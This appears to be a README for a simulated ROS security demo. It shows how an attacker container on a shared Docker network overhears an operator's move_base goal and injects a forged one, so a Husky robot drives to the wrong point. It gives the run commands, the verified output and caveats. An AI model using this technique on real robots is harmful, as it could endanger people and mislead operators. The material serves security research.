# Goal-Hijack Attack — demo run

`attack_goal.py` models the realistic ROS attack: an attacker on the same network
reaches the trust-anyone graph, **overhears** the operator's move_base goal
(SUBSCRIBE), and **injects** a fake one (PUBLISH) so the robot drives to the
attacker's target instead. Design:
`docs/superpowers/specs/2026-08-02-goal-hijack-attack-design.md`.

Verified end-to-end on 2026-08-02 via the committed `docker compose` flow (no
manual overrides): attacker and operator ran as separate host-peers on a shared
`husky_lan` network, the attacker overheard `(10, 0)` and injected `(10, 12)`, and
the robot drove toward `(10, 12)`.

## Topology (what makes it realistic)

- **Robot** — NATIVE on the host (a real box on the LAN), reached via the
  `husky_lan` gateway.
- **Operator** — a container with its own IP on `husky_lan` (e.g. 172.20.0.3).
- **Attacker** — a container with its own IP on `husky_lan` (e.g. 172.20.0.2).

Operator and attacker are peers on one shared Docker network — the "attacker
joined the LAN and attacks" model. ROS message data is peer-to-peer
(publisher→subscriber direct TCP), so the attacker must be able to reach the
operator's IP; the shared `husky_lan` is what makes that hold.

## Run (four terminals)

**Terminal 0 — one-time network + host prep:**
```bash
docker network create husky_lan 2>/dev/null || true
GW="$(docker network inspect husky_lan --format '{{(index .IPAM.Config 0).Gateway}}')"
export ROS_IP="${GW}" ROS_MASTER_URI="http://${GW}:11311"
export ROBOT_HOST_IP="${GW}"
```

**Terminal 1 — world (native):**
```bash
export ROS_IP="${GW}" ROS_MASTER_URI="http://${GW}:11311"
./load-park-stock-husky.sh
```

**Terminal 2 — spawn robot + move_base, idle (native):**
```bash
export ROS_IP="${GW}" ROS_MASTER_URI="http://${GW}:11311"
./spawn-robot-idle.sh
```

**Terminal 3 — attacker lurks (container on husky_lan):**
```bash
cd attacker
export ROBOT_HOST_IP="${GW}"
docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 12
```
Waits at `Subscription connected (...). READY — now waiting for the operator's goal.`
Start this BEFORE the operator so it doesn't miss the one-shot goal.

**Terminal 4 — operator sends the real mission (container on husky_lan):**
```bash
cd operator
export ROBOT_HOST_IP="${GW}"
docker compose run --rm operator ./operator/operate.py --goal-x 10 --goal-y 0
```

## Result (verified)

Attacker console:
```
OVERHEARD operator goal: (10.00, 0.00)
INJECTING fake goal: real=(10.00,0.00) + offset=(0.00,12.00) -> fake=(10.00,12.00)
```
- Robot drove diagonally from origin toward **(10, 12)**, NOT the operator's (10, 0).
- `attack_goal_report.csv`: `real_goal=(10,0)`, `fake_goal=(10,12)`, `robot_x/robot_y`
  climb toward the fake goal.
- `operator_run.csv`: `ref=(10,0)` — the operator *believed* it sent the robot to
  (10, 0). **Operator intent ≠ robot path = the hijack.**

## Honest caveats

- **Detectable on the graph.** This is a rogue PUBLISH, so
  `rostopic info /move_base/goal` shows an extra publisher besides the operator.
  That is exactly what real attackers do (Shodan-exposed or pivoted-into masters,
  publishing to the trust-anyone graph). The fully *stealthy* variant — rewriting
  the operator's own goal packet in flight so no extra publisher appears — is
  on-the-wire MITM, which is the academic/research path and deliberately NOT built.
- **Entry is assumed, not exploited here.** The attacker container models a machine
  already on the network. The realistic *entry* chain (exposed master, or pivot
  from a breached `HuskyA300-Dashboard-main` web app per
  `docs/attacker-network-simulation.md` §9) is documented, not built.
- **Timing.** Start the attacker before the operator; it waits (bounded by
  `--timeout`) for the operator's one-shot goal, and its subscription must be
  connected first (handled by the READY connection-settle step).
